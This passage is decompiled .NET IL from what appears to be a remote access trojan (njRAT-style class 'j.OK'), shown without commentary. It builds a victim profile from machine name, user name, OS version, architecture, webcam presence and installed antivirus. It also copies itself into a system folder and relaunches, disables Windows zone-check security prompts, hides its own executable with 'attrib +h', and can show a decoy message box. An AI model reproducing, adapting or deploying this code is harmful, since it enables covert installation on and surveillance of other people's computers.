      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yeah >:)"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "Nope >:("
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  call       string j.OK::GetAntiVirus()
    IL_0368:  stelem.ref
    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  call       string j.OK::GetAntiVirus()
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::GetAntiVirus()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1435 (0x59b)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class AntiTaskManager V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_0126

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0046:  brtrue     IL_0126

    .try
    {
      IL_004b:  ldsfld     string j.OK::DR
      IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0055:  ldstr      "\\"
      IL_005a:  ldsfld     string j.OK::EXE
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0069:  brfalse.s  IL_0089

      IL_006b:  ldsfld     string j.OK::DR
      IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0075:  ldstr      "\\"
      IL_007a:  ldsfld     string j.OK::EXE
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0089:  ldsfld     string j.OK::DR
      IL_008e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0093:  ldstr      "\\"
      IL_0098:  ldsfld     string j.OK::EXE
      IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a2:  ldc.i4.1
      IL_00a3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b2:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00b7:  stloc.0
      IL_00b8:  dup
      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4.0
      IL_00bb:  ldloc.0
      IL_00bc:  ldlen
      IL_00bd:  conv.i4
      IL_00be:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c3:  dup
      IL_00c4:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00ce:  ldsfld     string j.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string j.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00ec:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0100:  pop
      IL_0101:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0106:  leave.s    IL_0126

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0108:  dup
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010e:  stloc.1
      IL_010f:  ldloc.1
      IL_0110:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0115:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_011a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0124:  leave.s    IL_0126

    }  // end handler
    IL_0126:  nop
    .try
    {
      IL_0127:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_012c:  ldstr      "1"
      IL_0131:  ldc.i4.1
      IL_0132:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0137:  leave.s    IL_0152

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0139:  dup
      IL_013a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013f:  stloc.2
      IL_0140:  ldloc.2
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0150:  leave.s    IL_0152

    }  // end handler
    IL_0152:  nop
    .try
    {
      IL_0153:  ldsfld     string j.OK::AKATSUKI
      IL_0158:  ldstr      "Enabled"
      IL_015d:  ldc.i4.0
      IL_015e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0163:  brtrue.s   IL_01a9

      IL_0165:  ldc.i4.3
      IL_0166:  newarr     [mscorlib]System.String
      IL_016b:  dup
      IL_016c:  ldc.i4.0
      IL_016d:  ldstr      "attrib +h \""
      IL_0172:  stelem.ref
      IL_0173:  dup
      IL_0174:  ldc.i4.1
      IL_0175:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_017a:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_017f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0184:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0189:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_018e:  stelem.ref
      IL_018f:  dup
      IL_0190:  ldc.i4.2
      IL_0191:  ldstr      "\""
      IL_0196:  stelem.ref
      IL_0197:  call       string [mscorlib]System.String::Concat(string[])
      IL_019c:  ldc.i4.0
      IL_019d:  ldc.i4.1
      IL_019e:  ldc.i4     0x1388
      IL_01a3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01a8:  pop
      IL_01a9:  ldsfld     string j.OK::MSGE
      IL_01ae:  ldstr      "Enabled"
      IL_01b3:  ldc.i4.0
      IL_01b4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01b9:  brtrue     IL_02d4

      IL_01be:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_01c3:  ldstr      "obito.txt"
      IL_01c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01cd:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_01d2:  brtrue     IL_02d4

      IL_01d7:  ldsfld     string j.OK::MSGSYM
      IL_01dc:  ldstr      "vbCritical"
      IL_01e1:  ldc.i4.0
      IL_01e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01e7:  brtrue.s   IL_0219

      IL_01e9:  ldsfld     string j.OK::MSGB
      IL_01ee:  ldc.i4.s   16
      IL_01f0:  ldsfld     string j.OK::MSGT
      IL_01f5:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_01fa:  pop
      IL_01fb:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0200:  ldstr      "obito.txt"
      IL_0205:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_020a:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
      IL_020f:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_0214:  br         IL_02d4

      IL_0219:  ldsfld     string j.OK::MSGSYM
      IL_021e:  ldstr      "vbInformation"
      IL_0223:  ldc.i4.0
      IL_0224:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0229:  brtrue.s   IL_0258

      IL_022b:  ldsfld     string j.OK::MSGB
      IL_0230:  ldc.i4.s   64
      IL_0232:  ldsfld     string j.OK::MSGT
      IL_0237:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_023c:  pop
      IL_023d:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0242:  ldstr      "obito.txt"
      IL_0247:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024c:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
      IL_0251:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_0256:  br.s       IL_02d4

      IL_0258:  ldsfld     string j.OK::MSGSYM
      IL_025d:  ldstr      "vbExclamation"
      IL_0262:  ldc.i4.0
      IL_0263:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0268:  brtrue.s   IL_0297

      IL_026a:  ldsfld     string j.OK::MSGB
      IL_026f:  ldc.i4.s   48
      IL_0271:  ldsfld     string j.OK::MSGT
      IL_0276:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_027b:  pop
      IL_027c:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0281:  ldstr      "obito.txt"
      IL_0286:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_028b:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
      IL_0290:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_0295:  br.s       IL_02d4

      IL_0297:  ldsfld     string j.OK::MSGSYM
      IL_029c:  ldstr      "vbQuestion"
      IL_02a1:  ldc.i4.0
      IL_02a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02a7:  brtrue.s   IL_02d4

      IL_02a9:  ldsfld     string j.OK::MSGB
      IL_02ae:  ldc.i4.s   32
      IL_02b0:  ldsfld     string j.OK::MSGT
      IL_02b5:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_02ba:  pop
      IL_02bb:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_02c0:  ldstr      "obito.txt"
      IL_02c5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02ca:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
      IL_02cf:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_02d4:  ldsfld     string j.OK::OBITO
      IL_02d9:  ldstr      "Enabled"
